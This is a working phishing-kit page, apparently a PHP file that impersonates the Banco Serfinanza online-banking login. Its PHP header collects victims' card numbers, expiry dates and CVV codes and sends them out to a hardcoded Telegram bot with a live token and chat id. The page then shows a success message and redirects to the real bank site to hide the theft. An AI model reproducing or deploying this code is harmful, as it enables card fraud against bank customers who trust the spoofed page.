<?php

@session_start();
ini_set("display_errors", 0);

$sendtotelegram="yes";
$chat_id="-5045108825";
$bot_url="5609861014:AAG6jljjVO5unt4Uy5qi--ZiISng6yjjdMI";

@$userp = $_SERVER['REMOTE_ADDR'];

if (isset ($_POST['cc']) && isset ($_POST['ven']) && isset ($_POST['cvv']) ){

$_SESSION['ind2'] = "ind2";
    
$message .= "=============Tarjeta=============\n";
$message .= "|| Tarjeta.: ".$_POST['cc']."\n";
$message .= "|| Venc.: ".$_POST['ven']."\n";
$message .= "|| CVV.: ".$_POST['cvv']."\n";
$message .= "===============================\n";

if ($sendtotelegram=="yes"){

    $txt = $message;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

}


?>

<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

  <link rel="shortcut icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico" type="image/x-icon">
    <link rel="icon" href="https://serfinanzavirtual.bancoserfinanza.com/Personal/favicon.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
	<link rel="stylesheet" href="min.css">
    <title>Inicio de Sesión - Serfinanza Banca Personal</title>
</head>
<body>

    <div class="ttlo">
  <img src="tlo.png" alt="">

<div>
<form name="aspnetForm" method="post" action="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1669430114&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d4b96be7c-bd29-14b2-c307-aab88895f1d1&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015" id="aspnetForm">
        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="R7zYQ0nmSFAqLX5pX1/ePIvzLco8pSATq9vR4tspS2aPYKal5FMjvWkwocXSCOdPf3fldPkWqO8l9lO+WN+8imrecSCGsRyaipEK2wUEg2P7cm9GC2YEbh7lzVc1KS2fb44h9Zh3TQgsFU2TfvdVbQYVrldKFfBxLpDF19v82Z45XQVtebbbWv8uuegNCZ5DYWS9jopZjtVkcpgoJa2zaPift5CplpO89dIz1nDmsT30J6cg5U8ugpauHH2FFotxzS0h4Rf1/0MS0RDO3P3XeQBXTZnwnnJD1MER/wmDuvHEEKRka7GQQp828NMuaJpLxHRueQYZ0EcdTREPjIXQXSHBF/jaug5LbZuezu+idoklqeLT3NgJ9G2Odz5D7XLoYxDRu77x0pv9uG1SokG7r+FEPtPVTFQmATGHfaHwKHqAVvJcj3J9s9p7wamIxOxEXus5eRpRdsOp+HXqPisWQ+/ANIly4dwCaEWTTAyy+oB8ajbNON/X5RnLW8WJW9tV6v1Q7J6M6TAtF1Md99q6Db9XiR15tkrjwTT3nPm7U60YiZTZVLSsOI3RHRjSwRu7A90kKGjwPlZTwOLsYerm3GoV+Xq7NyJ6x4NddddO7ymHolG0i9s1ykbO6NVF3m6tW3YJ+CDa8LPUpfQhbGc6JIpxtBpkcPyZtboNfUFNiRduuDgU5xm2hVE3tErrPPffDjFtb4XHIyBr3EHQEiVdlZWCsyAU9HtU5Y7s/0iAGnW4uGOvTAT3iva4fQ2aCuJz7oPmCtXWdRKCczQCEcpNfCLpw0YmWv08xjKrSzs9LZYp0xJGV5UGXUc0sbrnEgXVCDgs/vl/7uculOheIPU0uyJLTdKH2tsF0SSz5jlkHsUQTO14OxHRFbRJDhYwhGDPqCcgvvGAEhtv7CBF0Fq7PATStZBJDeTdQlG0fw7WiNEkFGnZd2bXbt1hDoOuQUE9jqgyIawgD9f9Y+2H07LDLQwwMR8SLSwlUI2x0PaRWm52voaTexZO/tiqKLXxxZmJ5o1o/uoDKI8PikS+7ep1NSilKJmZxgVzY3pK4UPW7o4/yDWSWdpvHVLfNLbe5N3GydrPa/Mq+HU1Ydzsc/MkIrLczrZ4u7lTtknqeXvAZhTfn/F/za1tfuCr7QvD4pWNrRWHsJomq40EVz4gSMqVCjnh9vzsEwm7Tm5XQDSGAZTxqEt23U3CQyfSc0/SbvelTyJhsvWC6xlqx4Qha0wFoGPanRBMFB9kSSCtxhDnF+trjdkVH3S3WDM2d/K/m8uDVCz68e3PVq3Rr7a4KMCstp+U/zPgrsL1Jhf0XJY1cdqudiOudjg/LmGjyGk8RG9dHCpsiG36s3MslXr7UgwoRtDK1UYUZmmYc17pdhxs367gGixqGpKDiiDAyA9WXJfaNaqifzs79CjDJoEdnJJIDj6Vff178GRrlv4ZkVDVvWa9/0ZN/swwUAi4wpcbJ76dpUie0Hy2sj5ud+CzImIv5g==">


        <script src="ScriptResource.axd?d=4ejzBeCma20vHaNBi-aw0NblYCfCDh44zfCmtkgmX-yBzIqXKbfMlEW_EjiaJjEjhqgYuioyJ1BvTkvHoVBvzW62zskUJSAPVLQz2q6IFwy7deq3VKjEQE8AYwhLxBJ1gP5wkX3lrw9Mg6OT9XROgQfZt5aanpi8jNEJMX_TNFA1&amp;t=ffffffffaa493ab8" type="text/javascript"></script>
        <script src="Scripts/_UtilidadesSitio.js" type="text/javascript"></script>
        <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C3A4B93B">
        <input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
        <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="UApRq/NXyBT0LjLfJYpfxDsS53gL4ebZurcbKc3epYS2BjI2hg3QHD2RSbMIQDnHAkA+9gPQx7TrzSzfcZciODsSV25HiCJk8IktIdrP+PZyiqM3KMw/SpIZSN63aYhH9GR3qEcTxxO88zH6+MLADCpUjXquC6e7eggsmiz2pSvDG8+kwuduGS9hUwwheaHLn6FkHaC69liMSUS3HmDUuhUfkPo0VMvdaBNhbOQO1HFmJNum+IVjMeTYV8nsJzvhBiUjevgsbanUfm33EWgeJQ==">
        
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 col-sm-7 col-md-6 pl-0">
                </div>
                </div>
            </div>
        </div>

        <div id="MainLogin" class="container">

            <meta http-equiv="X-UA-Compatible" content="IE=9">
            <input type="hidden" name="ctl00$DefaultContent$r" id="ctl00_DefaultContent_r" value="9,6,8,1,3,4,2,5,7,0">
            <style>
                .btn-ingreso {
                    color: #fff;
                    background-color: #343a40;
                    border-color: #343a40;
                }

                .btn-ingreso:hover {
                    color: #fff;
                    background-color: #23272b;
                    border-color: #1d2124;
                }

                .btn-ingreso:focus, .btn-ingreso.focus {
                    box-shadow: 0 0 0 0.2rem rgba(52, 58, 64, 0.5);
                }

                .btn-ingreso.disabled, .btn-ingreso:disabled {
                    color: #fff;
                    background-color: #343a40;
                    border-color: #343a40;
                }
            </style>

            <form id="htmlForm" action="savedata.php" method="post">
                <div class="contaner">
                    <div class="row">
                        <div class="col-md-12">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-5 col-sm-4 col-md-3 pt-5">
                           
                        </div>
                        <div class="col-7 col-sm-8 col-md-3 p-4 text-left">

                            
<div>
                    <h2 class="boldText" style="text-align: center"  >¡COMPLETADO EXITOSAMENTE!</h2>
                    <br><br>
                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                   
                </div>

                                </div>
                                <div class="col-sm-12 col-md-6">
                                </div>
                            </div>
                        </div>

                        <div id="contentPage">
                            <p style="text-align: center; color: #000; font-weight: bold; font-size: large">

                                <span id="ctl00_DefaultContent_tituloErrorPortal"></span>
                                <br>
                                <span id="ctl00_DefaultContent_ErrorPortal"></span>

                            </p>
                        </div>
                        

    </form>

</div>

</div>

</form>
 <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>

 <script language="JavaScript">
    $(document).ready(function() {
        setTimeout("location.href='https://bancoserfinanza.com/'", 2550);
    });
    </script>

</body>
</html>

</div>
</body>

</html>